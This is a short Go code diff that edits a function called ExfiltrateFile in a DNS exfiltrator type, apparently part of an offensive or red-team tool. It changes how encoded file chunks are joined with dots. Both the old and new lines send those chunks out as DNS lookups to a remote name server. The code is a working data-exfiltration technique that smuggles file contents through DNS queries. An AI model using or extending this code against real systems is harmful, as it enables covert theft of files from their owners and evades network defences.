@@ -64,10 +64,7 @@ func (ex *dnsExfiltrator) ExfiltrateFile(filename string) {
 				numBytesToAdd = remainingBytes
 			}
 
-			if dataToExfiltrate != "" {
-				dataToExfiltrate += "."
-			}
-			dataToExfiltrate += encodedData[:numBytesToAdd]
+			dataToExfiltrate += encodedData[:numBytesToAdd] + "."
 			encodedData = encodedData[numBytesToAdd:]
 			if len(encodedData) == 0 {
 				break
@@ -77,7 +74,7 @@ func (ex *dnsExfiltrator) ExfiltrateFile(filename string) {
 			bytesLeft -= numBytesToAdd + 1
 		}
 
-		_, err := net.DefaultResolver.LookupIP(context.Background(), "ip4", dataToExfiltrate+"."+ex.NameServer)
+		_, err := net.DefaultResolver.LookupIP(context.Background(), "ip4", dataToExfiltrate+ex.NameServer)
 		if err != nil {
 			log.Fatalln(err)
 		}
